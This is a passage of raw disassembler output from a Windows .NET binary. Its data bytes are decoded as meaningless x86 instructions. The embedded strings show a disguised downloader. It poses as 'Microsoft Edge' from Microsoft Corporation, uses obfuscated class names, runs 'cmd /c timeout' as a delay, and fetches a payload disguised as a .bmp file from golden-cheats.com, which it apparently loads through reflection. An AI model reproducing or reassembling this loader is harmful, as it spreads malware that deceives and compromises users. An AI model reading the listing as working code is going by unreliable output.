   1400030f1:	79 73                	jns    0x140003166
   1400030f3:	74 65                	je     0x14000315a
   1400030f5:	6d                   	insl   (%dx),(%rdi)
   1400030f6:	2e 44 69 61 67 6e 6f 	cs imul $0x74736f6e,0x67(%rcx),%r12d
   1400030fd:	73 74 
   1400030ff:	69 63 73 00 47 65 74 	imul   $0x74654700,0x73(%rbx),%esp
   140003106:	4d                   	rex.WRB
   140003107:	65 74 68             	gs je  0x140003172
   14000310a:	6f                   	outsl  (%rsi),(%dx)
   14000310b:	64 73 00             	fs jae 0x14000310e
   14000310e:	53                   	push   %rbx
   14000310f:	79 73                	jns    0x140003184
   140003111:	74 65                	je     0x140003178
   140003113:	6d                   	insl   (%dx),(%rdi)
   140003114:	2e 52                	cs push %rdx
   140003116:	75 6e                	jne    0x140003186
   140003118:	74 69                	je     0x140003183
   14000311a:	6d                   	insl   (%dx),(%rdi)
   14000311b:	65 2e 49 6e          	gs rex.WB outsb %gs:(%rsi),(%dx)
   14000311f:	74 65                	je     0x140003186
   140003121:	72 6f                	jb     0x140003192
   140003123:	70 53                	jo     0x140003178
   140003125:	65 72 76             	gs jb  0x14000319e
   140003128:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%rbx),%esp
   14000312f:	73 74                	jae    0x1400031a5
   140003131:	65 6d                	gs insl (%dx),(%rdi)
   140003133:	2e 52                	cs push %rdx
   140003135:	75 6e                	jne    0x1400031a5
   140003137:	74 69                	je     0x1400031a2
   140003139:	6d                   	insl   (%dx),(%rdi)
   14000313a:	65 2e 43 6f          	gs rex.XB outsl %gs:(%rsi),(%dx)
   14000313e:	6d                   	insl   (%dx),(%rdi)
   14000313f:	70 69                	jo     0x1400031aa
   140003141:	6c                   	insb   (%dx),(%rdi)
   140003142:	65 72 53             	gs jb  0x140003198
   140003145:	65 72 76             	gs jb  0x1400031be
   140003148:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%rbx),%esp
   14000314f:	73 74                	jae    0x1400031c5
   140003151:	65 6d                	gs insl (%dx),(%rdi)
   140003153:	2e 52                	cs push %rdx
   140003155:	65 73 6f             	gs jae 0x1400031c7
   140003158:	75 72                	jne    0x1400031cc
   14000315a:	63 65 73             	movsxd 0x73(%rbp),%esp
   14000315d:	00 4a 64             	add    %cl,0x64(%rdx)
   140003160:	63 75 6f             	movsxd 0x6f(%rbp),%esi
   140003163:	2e 50                	cs push %rax
   140003165:	72 6f                	jb     0x1400031d6
   140003167:	70 65                	jo     0x1400031ce
   140003169:	72 74                	jb     0x1400031df
   14000316b:	69 65 73 2e 52 65 73 	imul   $0x7365522e,0x73(%rbp),%esp
   140003172:	6f                   	outsl  (%rsi),(%dx)
   140003173:	75 72                	jne    0x1400031e7
   140003175:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003178:	2e 72 65             	jb,pn  0x1400031e0
   14000317b:	73 6f                	jae    0x1400031ec
   14000317d:	75 72                	jne    0x1400031f1
   14000317f:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003182:	00 44 65 62          	add    %al,0x62(%rbp,%riz,2)
   140003186:	75 67                	jne    0x1400031ef
   140003188:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%esi),%ebp
   14000318f:	65 
   140003190:	73 00                	jae    0x140003192
   140003192:	4a                   	rex.WX
   140003193:	64 63 75 6f          	movsxd %fs:0x6f(%rbp),%esi
   140003197:	2e 50                	cs push %rax
   140003199:	72 6f                	jb     0x14000320a
   14000319b:	70 65                	jo     0x140003202
   14000319d:	72 74                	jb     0x140003213
   14000319f:	69 65 73 00 4e 61 6d 	imul   $0x6d614e00,0x73(%rbp),%esp
   1400031a6:	65 73 00             	gs jae 0x1400031a9
   1400031a9:	47                   	rex.RXB
   1400031aa:	65 74 54             	gs je  0x140003201
   1400031ad:	79 70                	jns    0x14000321f
   1400031af:	65 73 00             	gs jae 0x1400031b2
   1400031b2:	42 69 6e 64 69 6e 67 	rex.X imul $0x46676e69,0x64(%rsi),%ebp
   1400031b9:	46 
   1400031ba:	6c                   	insb   (%dx),(%rdi)
   1400031bb:	61                   	(bad)
   1400031bc:	67 73 00             	addr32 jae 0x1400031bf
   1400031bf:	53                   	push   %rbx
   1400031c0:	65 74 74             	gs je  0x140003237
   1400031c3:	69 6e 67 73 00 61 72 	imul   $0x72610073,0x67(%rsi),%ebp
   1400031ca:	67 73 00             	addr32 jae 0x1400031cd
   1400031cd:	53                   	push   %rbx
   1400031ce:	79 73                	jns    0x140003243
   1400031d0:	74 65                	je     0x140003237
   1400031d2:	6d                   	insl   (%dx),(%rdi)
   1400031d3:	2e 57                	cs push %rdi
   1400031d5:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%rsi),%ebp
   1400031dc:	46 6f                	rex.RX outsl (%rsi),(%dx)
   1400031de:	72 6d                	jb     0x14000324d
   1400031e0:	73 00                	jae    0x1400031e2
   1400031e2:	50                   	push   %rax
   1400031e3:	72 6f                	jb     0x140003254
   1400031e5:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400031e8:	73 00                	jae    0x1400031ea
   1400031ea:	73 65                	jae    0x140003251
   1400031ec:	74 5f                	je     0x14000324d
   1400031ee:	41 72 67             	rex.B jb 0x140003258
   1400031f1:	75 6d                	jne    0x140003260
   1400031f3:	65 6e                	outsb  %gs:(%rsi),(%dx)
   1400031f5:	74 73                	je     0x14000326a
   1400031f7:	00 63 6f             	add    %ah,0x6f(%rbx)
   1400031fa:	6d                   	insl   (%dx),(%rdi)
   1400031fb:	70 6f                	jo     0x14000326c
   1400031fd:	6e                   	outsb  (%rsi),(%dx)
   1400031fe:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003200:	74 73                	je     0x140003275
   140003202:	00 4f 62             	add    %cl,0x62(%rdi)
   140003205:	6a 65                	push   $0x65
   140003207:	63 74 00 53          	movsxd 0x53(%rax,%rax,1),%esi
   14000320b:	79 73                	jns    0x140003280
   14000320d:	74 65                	je     0x140003274
   14000320f:	6d                   	insl   (%dx),(%rdi)
   140003210:	2e 4e                	cs rex.WRX
   140003212:	65 74 00             	gs je  0x140003215
   140003215:	67 65 74 5f          	addr32 gs je 0x140003278
   140003219:	44                   	rex.R
   14000321a:	65 66 61             	gs data16 (bad)
   14000321d:	75 6c                	jne    0x14000328b
   14000321f:	74 00                	je     0x140003221
   140003221:	46 69 72 73 74 4f 72 	rex.RX imul $0x44724f74,0x73(%rdx),%r14d
   140003228:	44 
   140003229:	65 66 61             	gs data16 (bad)
   14000322c:	75 6c                	jne    0x14000329a
   14000322e:	74 00                	je     0x140003230
   140003230:	49 6e                	rex.WB outsb (%rsi),(%dx)
   140003232:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%rcx,%rbp,2),%esi
   140003239:	65 
   14000323a:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14000323c:	6d                   	insl   (%dx),(%rdi)
   14000323d:	70 6f                	jo     0x1400032ae
   14000323f:	6e                   	outsb  (%rsi),(%dx)
   140003240:	65 6e                	outsb  %gs:(%rsi),(%dx)
   140003242:	74 00                	je     0x140003244
   140003244:	53                   	push   %rbx
   140003245:	74 61                	je     0x1400032a8
   140003247:	72 74                	jb     0x1400032bd
   140003249:	00 48 74             	add    %cl,0x74(%rax)
   14000324c:	74 70                	je     0x1400032be
   14000324e:	57                   	push   %rdi
   14000324f:	65 62 52 65 71 75    	(bad)
   140003255:	65 73 74             	gs jae 0x1400032cc
   140003258:	00 67 65             	add    %ah,0x65(%rdi)
   14000325b:	74 5f                	je     0x1400032bc
   14000325d:	54                   	push   %rsp
   14000325e:	65 78 74             	gs js  0x1400032d5
   140003261:	00 73 65             	add    %dh,0x65(%rbx)
   140003264:	74 5f                	je     0x1400032c5
   140003266:	54                   	push   %rsp
   140003267:	65 78 74             	gs js  0x1400032de
   14000326a:	00 47 67             	add    %al,0x67(%rdi)
   14000326d:	79 66                	jns    0x1400032d5
   14000326f:	70 62                	jo     0x1400032d3
   140003271:	67 62                	addr32 (bad)
   140003273:	68 62 71 73 77       	push   $0x77737162
   140003278:	00 42 6f             	add    %al,0x6f(%rdx)
   14000327b:	78 00                	js     0x14000327d
   14000327d:	54                   	push   %rsp
   14000327e:	6f                   	outsl  (%rsi),(%dx)
   14000327f:	41 72 72             	rex.B jb 0x1400032f4
   140003282:	61                   	(bad)
   140003283:	79 00                	jns    0x140003285
   140003285:	67 65 74 5f          	addr32 gs je 0x1400032e8
   140003289:	41 73 73             	rex.B jae 0x1400032ff
   14000328c:	65 6d                	gs insl (%dx),(%rdi)
   14000328e:	62 6c 79 00 6f       	(bad)
   140003293:	70 5f                	jo     0x1400032f4
   140003295:	45 71 75             	rex.RB jno 0x14000330d
   140003298:	61                   	(bad)
   140003299:	6c                   	insb   (%dx),(%rdi)
   14000329a:	69 74 79 00 00 00 00 	imul   $0xb000000,0x0(%rcx,%rdi,2),%esi
   1400032a1:	0b 
   1400032a2:	46 00 6f 00          	rex.RX add %r13b,0x0(%rdi)
   1400032a6:	72 00                	jb     0x1400032a8
   1400032a8:	6d                   	insl   (%dx),(%rdi)
   1400032a9:	00 31                	add    %dh,(%rcx)
   1400032ab:	00 00                	add    %al,(%rax)
   1400032ad:	07                   	(bad)
   1400032ae:	63 00                	movsxd (%rax),%eax
   1400032b0:	6d                   	insl   (%dx),(%rdi)
   1400032b1:	00 64 00 00          	add    %ah,0x0(%rax,%rax,1)
   1400032b5:	33 2f                	xor    (%rdi),%ebp
   1400032b7:	00 63 00             	add    %ah,0x0(%rbx)
   1400032ba:	20 00                	and    %al,(%rax)
   1400032bc:	74 00                	je     0x1400032be
   1400032be:	69 00 6d 00 65 00    	imul   $0x65006d,(%rax),%eax
   1400032c4:	6f                   	outsl  (%rsi),(%dx)
   1400032c5:	00 75 00             	add    %dh,0x0(%rbp)
   1400032c8:	74 00                	je     0x1400032ca
   1400032ca:	20 00                	and    %al,(%rax)
   1400032cc:	2f                   	(bad)
   1400032cd:	00 6e 00             	add    %ch,0x0(%rsi)
   1400032d0:	6f                   	outsl  (%rsi),(%dx)
   1400032d1:	00 62 00             	add    %ah,0x0(%rdx)
   1400032d4:	72 00                	jb     0x1400032d6
   1400032d6:	65 00 61 00          	add    %ah,%gs:0x0(%rcx)
   1400032da:	6b 00 20             	imul   $0x20,(%rax),%eax
   1400032dd:	00 2f                	add    %ch,(%rdi)
   1400032df:	00 74 00 20          	add    %dh,0x20(%rax,%rax,1)
   1400032e3:	00 32                	add    %dh,(%rdx)
   1400032e5:	00 30                	add    %dh,(%rax)
   1400032e7:	00 00                	add    %al,(%rax)
   1400032e9:	73 68                	jae    0x140003353
   1400032eb:	00 74 00 74          	add    %dh,0x74(%rax,%rax,1)
   1400032ef:	00 70 00             	add    %dh,0x0(%rax)
   1400032f2:	3a 00                	cmp    (%rax),%al
   1400032f4:	2f                   	(bad)
   1400032f5:	00 2f                	add    %ch,(%rdi)
   1400032f7:	00 67 00             	add    %ah,0x0(%rdi)
   1400032fa:	6f                   	outsl  (%rsi),(%dx)
   1400032fb:	00 6c 00 64          	add    %ch,0x64(%rax,%rax,1)
   1400032ff:	00 65 00             	add    %ah,0x0(%rbp)
   140003302:	6e                   	outsb  (%rsi),(%dx)
   140003303:	00 2d 00 63 00 68    	add    %ch,0x68006300(%rip)        # 0x1a8009609
   140003309:	00 65 00             	add    %ah,0x0(%rbp)
   14000330c:	61                   	(bad)
   14000330d:	00 74 00 73          	add    %dh,0x73(%rax,%rax,1)
   140003311:	00 2e                	add    %ch,(%rsi)
   140003313:	00 63 00             	add    %ah,0x0(%rbx)
   140003316:	6f                   	outsl  (%rsi),(%dx)
   140003317:	00 6d 00             	add    %ch,0x0(%rbp)
   14000331a:	2f                   	(bad)
   14000331b:	00 6c 00 6f          	add    %ch,0x6f(%rax,%rax,1)
   14000331f:	00 61 00             	add    %ah,0x0(%rcx)
   140003322:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   140003326:	72 00                	jb     0x140003328
   140003328:	2f                   	(bad)
   140003329:	00 75 00             	add    %dh,0x0(%rbp)
   14000332c:	70 00                	jo     0x14000332e
   14000332e:	6c                   	insb   (%dx),(%rdi)
   14000332f:	00 6f 00             	add    %ch,0x0(%rdi)
   140003332:	61                   	(bad)
   140003333:	00 64 00 73          	add    %ah,0x73(%rax,%rax,1)
   140003337:	00 2f                	add    %ch,(%rdi)
   140003339:	00 50 00             	add    %dl,0x0(%rax)
   14000333c:	75 00                	jne    0x14000333e
   14000333e:	72 00                	jb     0x140003340
   140003340:	65 00 5f 00          	add    %bl,%gs:0x0(%rdi)
   140003344:	56                   	push   %rsi
   140003345:	00 79 00             	add    %bh,0x0(%rcx)
   140003348:	66 00 63 00          	data16 add %ah,0x0(%rbx)
   14000334c:	70 00                	jo     0x14000334e
   14000334e:	6d                   	insl   (%dx),(%rdi)
   14000334f:	00 72 00             	add    %dh,0x0(%rdx)
   140003352:	61                   	(bad)
   140003353:	00 2e                	add    %ch,(%rsi)
   140003355:	00 62 00             	add    %ah,0x0(%rdx)
   140003358:	6d                   	insl   (%dx),(%rdi)
   140003359:	00 70 00             	add    %dh,0x0(%rax)
   14000335c:	01 3b                	add    %edi,(%rbx)
   14000335e:	4e 00 67 00          	rex.WRX add %r12b,0x0(%rdi)
   140003362:	62                   	(bad)
   140003363:	00 7a 00             	add    %bh,0x0(%rdx)
   140003366:	67 00 61 00          	add    %ah,0x0(%ecx)
   14000336a:	7a 00                	jp     0x14000336c
   14000336c:	78 00                	js     0x14000336e
   14000336e:	6e                   	outsb  (%rsi),(%dx)
   14000336f:	00 67 00             	add    %ah,0x0(%rdi)
   140003372:	78 00                	js     0x140003374
   140003374:	78 00                	js     0x140003376
   140003376:	6c                   	insb   (%dx),(%rdi)
   140003377:	00 74 00 67          	add    %dh,0x67(%rax,%rax,1)
   14000337b:	00 77 00             	add    %dh,0x0(%rdi)
   14000337e:	6f                   	outsl  (%rsi),(%dx)
   14000337f:	00 6e 00             	add    %ch,0x0(%rsi)
   140003382:	6c                   	insb   (%dx),(%rdi)
   140003383:	00 2e                	add    %ch,(%rsi)
   140003385:	00 46 00             	add    %al,0x0(%rsi)
   140003388:	63 00                	movsxd (%rax),%eax
   14000338a:	73 00                	jae    0x14000338c
   14000338c:	7a 00                	jp     0x14000338e
   14000338e:	6a 00                	push   $0x0
   140003390:	69 00 68 00 64 00    	imul   $0x640068,(%rax),%eax
   140003396:	68 00 00 25 59       	push   $0x59250000
   14000339b:	00 62 00             	add    %ah,0x0(%rdx)
   14000339e:	6a 00                	push   $0x0
   1400033a0:	6f                   	outsl  (%rsi),(%dx)
   1400033a1:	00 68 00             	add    %ch,0x0(%rax)
   1400033a4:	64 00 65 00          	add    %ah,%fs:0x0(%rbp)
   1400033a8:	74 00                	je     0x1400033aa
   1400033aa:	76 00                	jbe    0x1400033ac
   1400033ac:	78 00                	js     0x1400033ae
   1400033ae:	72 00                	jb     0x1400033b0
   1400033b0:	64 00 78 00          	add    %bh,%fs:0x0(%rax)
   1400033b4:	73 00                	jae    0x1400033b6
   1400033b6:	62                   	(bad)
   1400033b7:	00 78 00             	add    %bh,0x0(%rax)
   1400033ba:	67 00 74 00 00       	add    %dh,0x0(%eax,%eax,1)
   1400033bf:	35 4a 00 64 00       	xor    $0x64004a,%eax
   1400033c4:	63 00                	movsxd (%rax),%eax
   1400033c6:	75 00                	jne    0x1400033c8
   1400033c8:	6f                   	outsl  (%rsi),(%dx)
   1400033c9:	00 2e                	add    %ch,(%rsi)
   1400033cb:	00 50 00             	add    %dl,0x0(%rax)
   1400033ce:	72 00                	jb     0x1400033d0
   1400033d0:	6f                   	outsl  (%rsi),(%dx)
   1400033d1:	00 70 00             	add    %dh,0x0(%rax)
   1400033d4:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   1400033d8:	74 00                	je     0x1400033da
   1400033da:	69 00 65 00 73 00    	imul   $0x730065,(%rax),%eax
   1400033e0:	2e 00 52 00          	cs add %dl,0x0(%rdx)
   1400033e4:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400033e8:	6f                   	outsl  (%rsi),(%dx)
   1400033e9:	00 75 00             	add    %dh,0x0(%rbp)
   1400033ec:	72 00                	jb     0x1400033ee
   1400033ee:	63 00                	movsxd (%rax),%eax
   1400033f0:	65 00 73 00          	add    %dh,%gs:0x0(%rbx)
   1400033f4:	00 00                	add    %al,(%rax)
   1400033f6:	00 00                	add    %al,(%rax)
   1400033f8:	aa                   	stos   %al,(%rdi)
   1400033f9:	95                   	xchg   %eax,%ebp
   1400033fa:	d1 13                	rcll   $1,(%rbx)
   1400033fc:	72 4d                	jb     0x14000344b
   1400033fe:	7d 4d                	jge    0x14000344d
   140003400:	8c fb                	mov    %?,%ebx
   140003402:	e4 db                	in     $0xdb,%al
   140003404:	86 89 d6 e1 00 04    	xchg   %cl,0x400e1d6(%rcx)
   14000340a:	20 01                	and    %al,(%rcx)
   14000340c:	01 08                	add    %ecx,(%rax)
   14000340e:	03 20                	add    (%rax),%esp
   140003410:	00 01                	add    %al,(%rcx)
   140003412:	05 20 01 01 11       	add    $0x11010120,%eax
   140003417:	11 04 20             	adc    %eax,(%rax,%riz,1)
   14000341a:	01 01                	add    %eax,(%rcx)
   14000341c:	0e                   	(bad)
   14000341d:	04 20                	add    $0x20,%al
   14000341f:	01 01                	add    %eax,(%rcx)
   140003421:	02 05 20 02 01 0e    	add    0xe010220(%rip),%al        # 0x14e013647
   140003427:	0e                   	(bad)
   140003428:	06                   	(bad)
   140003429:	20 01                	and    %al,(%rcx)
   14000342b:	01 11                	add    %edx,(%rcx)
   14000342d:	80 85 03 07 01 02 06 	addb   $0x6,0x2010703(%rbp)
   140003434:	20 01                	and    %al,(%rcx)
   140003436:	01 11                	add    %edx,(%rcx)
   140003438:	80 9d 05 20 02 01 08 	sbbb   $0x8,0x1022005(%rbp)
   14000343f:	08 06                	or     %al,(%rsi)
   140003441:	20 01                	and    %al,(%rcx)
   140003443:	01 11                	add    %edx,(%rcx)
   140003445:	80 a1 09 07 04 1d 05 	andb   $0x5,0x1d040709(%rcx)
   14000344c:	12 51 02             	adc    0x2(%rcx),%dl
   14000344f:	1d 05 05 20 00       	sbb    $0x200505,%eax
   140003454:	12 80 a9 06 20 01    	adc    0x12006a9(%rax),%al
   14000345a:	01 11                	add    %edx,(%rcx)
   14000345c:	80 ad 03 20 00 02 08 	subb   $0x8,0x2002003(%rbp)
   140003463:	00 03                	add    %al,(%rbx)
   140003465:	01 12                	add    %edx,(%rdx)
   140003467:	80 b1 08 08 08 07 03 	xorb   $0x3,0x7080808(%rcx)
   14000346e:	12 55 1d             	adc    0x1d(%rbp),%dl
   140003471:	05 1d 05 05 20       	add    $0x2005051d,%eax
   140003476:	01 01                	add    %eax,(%rcx)
   140003478:	12 59 04             	adc    0x4(%rcx),%bl
   14000347b:	20 00                	and    %al,(%rax)
   14000347d:	1d 05 0a 07 04       	sbb    $0x4070a05,%eax
   140003482:	12 5d 12             	adc    0x12(%rbp),%bl
   140003485:	61                   	(bad)
   140003486:	12 59 12             	adc    0x12(%rcx),%bl
   140003489:	59                   	pop    %rcx
   14000348a:	06                   	(bad)
   14000348b:	00 01                	add    %al,(%rcx)
   14000348d:	01 11                	add    %edx,(%rcx)
   14000348f:	80 b9 06 00 01 12 80 	cmpb   $0x80,0x12010006(%rcx)
   140003496:	bd 0e 05 20 00       	mov    $0x20050e,%ebp
   14000349b:	12 80 c1 04 20 00    	adc    0x2004c1(%rax),%al
   1400034a1:	12 59 04             	adc    0x4(%rcx),%bl
   1400034a4:	07                   	(bad)
   1400034a5:	01 12                	add    %edx,(%rdx)
   1400034a7:	65 06                	gs (bad)
   1400034a9:	00 01                	add    %al,(%rcx)
   1400034ab:	12 65 1d             	adc    0x1d(%rbp),%ah
   1400034ae:	05 0b 07 06 12       	add    $0x1206070b,%eax
   1400034b3:	65 02 12             	add    %gs:(%rdx),%dl
   1400034b6:	69 02 12 6d 02 07    	imul   $0x7026d12,(%rdx),%eax
   1400034bc:	00 02                	add    %al,(%rdx)
   1400034be:	02 12                	add    (%rdx),%dl
   1400034c0:	65 12 65 05          	adc    %gs:0x5(%rbp),%ah
   1400034c4:	20 00                	and    %al,(%rax)
   1400034c6:	1d 12 69 08 15       	sbb    $0x15086912,%eax
   1400034cb:	12 80 c9 02 12 69    	adc    0x691202c9(%rax),%al
   1400034d1:	02 05 20 02 01 1c    	add    0x1c010220(%rip),%al        # 0x15c0136f7
   1400034d7:	18 14 10             	sbb    %dl,(%rax,%rdx,1)
   1400034da:	01 02                	add    %eax,(%rdx)
   1400034dc:	1e                   	(bad)
   1400034dd:	00 15 12 80 d1 01    	add    %dl,0x1d18012(%rip)        # 0x141d1b4f5
   1400034e3:	1e                   	(bad)
   1400034e4:	00 15 12 80 c9 02    	add    %dl,0x2c98012(%rip)        # 0x142c9b4fc
   1400034ea:	1e                   	(bad)
   1400034eb:	00 02                	add    %al,(%rdx)
   1400034ed:	04 0a                	add    $0xa,%al
   1400034ef:	01 12                	add    %edx,(%rdx)
   1400034f1:	69 07 00 02 02 12    	imul   $0x12020200,(%rdi),%eax
   1400034f7:	69 12 69 05 20 00    	imul   $0x200569,(%rdx),%edx
   1400034fd:	1d 12 6d 08 15       	sbb    $0x15086d12,%eax
   140003502:	12 80 c9 02 12 6d    	adc    0x6d1202c9(%rax),%al
   140003508:	02 04 0a             	add    (%rdx,%rcx,1),%al
   14000350b:	01 12                	add    %edx,(%rdx)
   14000350d:	6d                   	insl   (%dx),(%rdi)
   14000350e:	07                   	(bad)
   14000350f:	00 02                	add    %al,(%rdx)
   140003511:	02 12                	add    (%rdx),%dl
   140003513:	6d                   	insl   (%dx),(%rdi)
   140003514:	12 6d 03             	adc    0x3(%rbp),%ch
   140003517:	20 00                	and    %al,(%rax)
   140003519:	0e                   	(bad)
   14000351a:	0d 20 05 1c 0e       	or     $0xe1c0520,%eax
   14000351f:	11 80 d9 12 80 dd    	adc    %eax,-0x227fed27(%rax)
   140003525:	1c 1d                	sbb    $0x1d,%al
   140003527:	1c 05                	sbb    $0x5,%al
   140003529:	00 02                	add    %al,(%rdx)
   14000352b:	02 0e                	add    (%rsi),%cl
   14000352d:	0e                   	(bad)
   14000352e:	07                   	(bad)
   14000352f:	07                   	(bad)
   140003530:	03 02                	add    (%rdx),%eax
   140003532:	12 7d 12             	adc    0x12(%rbp),%bh
   140003535:	7d 07                	jge    0x14000353e
   140003537:	00 01                	add    %al,(%rcx)
   140003539:	12 69 11             	adc    0x11(%rcx),%ch
   14000353c:	80 e5 04             	and    $0x4,%ch
   14000353f:	20 00                	and    %al,(%rax)
   140003541:	12 65 06             	adc    0x6(%rbp),%ah
   140003544:	20 02                	and    %al,(%rdx)
   140003546:	01 0e                	add    %ecx,(%rsi)
   140003548:	12 65 05             	adc    0x5(%rbp),%ah
   14000354b:	07                   	(bad)
   14000354c:	01 12                	add    %edx,(%rdx)
   14000354e:	80 81 04 07 01 12 18 	addb   $0x18,0x12010704(%rcx)
   140003555:	08 00                	or     %al,(%rax)
   140003557:	01 12                	add    %edx,(%rdx)
   140003559:	80 e9 12             	sub    $0x12,%cl
   14000355c:	80 e9 08             	sub    $0x8,%cl
   14000355f:	b7 7a                	mov    $0x7a,%bh
   140003561:	5c                   	pop    %rsp
   140003562:	56                   	push   %rsi
   140003563:	19 34 e0             	sbb    %esi,(%rax,%riz,8)
   140003566:	89 08                	mov    %ecx,(%rax)
   140003568:	b0 3f                	mov    $0x3f,%al
   14000356a:	5f                   	pop    %rdi
   14000356b:	7f 11                	jg     0x14000357e
   14000356d:	d5 0a 3a 03          	{rex2 0xa} cmp (%rbx),%al
   140003571:	06                   	(bad)
   140003572:	12 4d 03             	adc    0x3(%rbp),%cl
   140003575:	06                   	(bad)
   140003576:	12 7d 04             	adc    0x4(%rbp),%bh
   140003579:	06                   	(bad)
   14000357a:	12 80 81 03 06 12    	adc    0x12060381(%rax),%al
   140003580:	18 05 00 01 01 1d    	sbb    %al,0x1d010100(%rip)        # 0x15d013686
   140003586:	0e                   	(bad)
   140003587:	06                   	(bad)
   140003588:	20 01                	and    %al,(%rcx)
   14000358a:	1d 05 1d 05 05       	sbb    $0x5051d05,%eax
   14000358f:	20 01                	and    %al,(%rcx)
   140003591:	1d 05 0e 05 20       	sbb    $0x20050e05,%eax
   140003596:	01 12                	add    %edx,(%rdx)
   140003598:	59                   	pop    %rcx
   140003599:	0e                   	(bad)
   14000359a:	05 20 01 02 12       	add    $0x12020120,%eax
   14000359f:	69 05 20 01 02 12 6d 	imul   $0x46d,0x12020120(%rip),%eax        # 0x1520236c9
   1400035a6:	04 00 00 
   1400035a9:	12 7d 05             	adc    0x5(%rbp),%bh
   1400035ac:	00 00                	add    %al,(%rax)
   1400035ae:	12 80 81 06 00 01    	adc    0x1000681(%rax),%al
   1400035b4:	01 12                	add    %edx,(%rdx)
   1400035b6:	80 81 04 00 00 12 18 	addb   $0x18,0x12000004(%rcx)
   1400035bd:	03 00                	add    (%rax),%eax
   1400035bf:	00 01                	add    %al,(%rcx)
   1400035c1:	04 08                	add    $0x8,%al
   1400035c3:	00 12                	add    %dl,(%rdx)
   1400035c5:	7d 05                	jge    0x1400035cc
   1400035c7:	08 00                	or     %al,(%rax)
   1400035c9:	12 80 81 04 08 00    	adc    0x80481(%rax),%al
   1400035cf:	12 18                	adc    (%rax),%bl
   1400035d1:	08 01                	or     %al,(%rcx)
   1400035d3:	00 08                	add    %cl,(%rax)
   1400035d5:	00 00                	add    %al,(%rax)
   1400035d7:	00 00                	add    %al,(%rax)
   1400035d9:	00 1e                	add    %bl,(%rsi)
   1400035db:	01 00                	add    %eax,(%rax)
   1400035dd:	01 00                	add    %eax,(%rax)
   1400035df:	54                   	push   %rsp
   1400035e0:	02 16                	add    (%rsi),%dl
   1400035e2:	57                   	push   %rdi
   1400035e3:	72 61                	jb     0x140003646
   1400035e5:	70 4e                	jo     0x140003635
   1400035e7:	6f                   	outsl  (%rsi),(%dx)
   1400035e8:	6e                   	outsb  (%rsi),(%dx)
   1400035e9:	45 78 63             	rex.RB js 0x14000364f
   1400035ec:	65 70 74             	gs jo  0x140003663
   1400035ef:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%rdi),%ebp
   1400035f6:	77 73                	ja     0x14000366b
   1400035f8:	01 08                	add    %ecx,(%rax)
   1400035fa:	01 00                	add    %eax,(%rax)
   1400035fc:	07                   	(bad)
   1400035fd:	01 00                	add    %eax,(%rax)
   1400035ff:	00 00                	add    %al,(%rax)
   140003601:	00 13                	add    %dl,(%rbx)
   140003603:	01 00                	add    %eax,(%rax)
   140003605:	0e                   	(bad)
   140003606:	4d 69 63 72 6f 73 6f 	imul   $0x666f736f,0x72(%r11),%r12
   14000360d:	66 
   14000360e:	74 20                	je     0x140003630
   140003610:	45                   	rex.RB
   140003611:	64 67 65 00 00       	fs add %al,%gs:(%eax)
   140003616:	05 01 00 00 00       	add    $0x1,%eax
   14000361b:	00 1a                	add    %bl,(%rdx)
   14000361d:	01 00                	add    %eax,(%rax)
   14000361f:	15 4d 69 63 72       	adc    $0x7263694d,%eax
   140003624:	6f                   	outsl  (%rsi),(%dx)
   140003625:	73 6f                	jae    0x140003696
   140003627:	66 74 20             	data16 je 0x14000364a
   14000362a:	43 6f                	rex.XB outsl (%rsi),(%dx)
   14000362c:	72 70                	jb     0x14000369e
   14000362e:	6f                   	outsl  (%rsi),(%dx)
   14000362f:	72 61                	jb     0x140003692
   140003631:	74 69                	je     0x14000369c
   140003633:	6f                   	outsl  (%rsi),(%dx)
   140003634:	6e                   	outsb  (%rsi),(%dx)
   140003635:	00 00                	add    %al,(%rax)
   140003637:	3a 01                	cmp    (%rcx),%al
   140003639:	00 35 43 6f 70 79    	add    %dh,0x79706f43(%rip)        # 0x1b970a582
   14000363f:	72 69                	jb     0x1400036aa
   140003641:	67 68 74 20 4d 69    	addr32 push $0x694d2074
   140003647:	63 72 6f             	movsxd 0x6f(%rdx),%esi
   14000364a:	73 6f                	jae    0x1400036bb
   14000364c:	66 74 20             	data16 je 0x14000366f
   14000364f:	43 6f                	rex.XB outsl (%rsi),(%dx)
   140003651:	72 70                	jb     0x1400036c3
   140003653:	6f                   	outsl  (%rsi),(%dx)
   140003654:	72 61                	jb     0x1400036b7
   140003656:	74 69                	je     0x1400036c1
   140003658:	6f                   	outsl  (%rsi),(%dx)
   140003659:	6e                   	outsb  (%rsi),(%dx)
   14000365a:	2e 20 41 6c          	cs and %al,0x6c(%rcx)
   14000365e:	6c                   	insb   (%dx),(%rdi)
   14000365f:	20 72 69             	and    %dh,0x69(%rdx)
   140003662:	67 68 74 73 20 72    	addr32 push $0x72207374
   140003668:	65 73 65             	gs jae 0x1400036d0
   14000366b:	72 76                	jb     0x1400036e3
   14000366d:	65 64 2e 00 00       	gs fs add %al,%fs:(%rax)
   140003672:	29 01                	sub    %eax,(%rcx)
   140003674:	00 24 33             	add    %ah,(%rbx,%rsi,1)
   140003677:	35 39 39 36 31       	xor    $0x31363939,%eax
   14000367c:	35 38 2d 64 35       	xor    $0x35642d38,%eax
   140003681:	39 33                	cmp    %esi,(%rbx)
   140003683:	2d 34 65 35 38       	sub    $0x38356534,%eax
   140003688:	2d 38 61 38 37       	sub    $0x37386138,%eax
   14000368d:	2d 31 61 36 62       	sub    $0x62366131,%eax
   140003692:	61                   	(bad)
   140003693:	35 35 66 37 63       	xor    $0x63376635,%eax
   140003698:	65 35 00 00 11 01    	gs xor $0x1110000,%eax
   14000369e:	00 0c 39             	add    %cl,(%rcx,%rdi,1)
   1400036a1:	37                   	(bad)
   1400036a2:	2e 30 2e             	cs xor %ch,(%rsi)
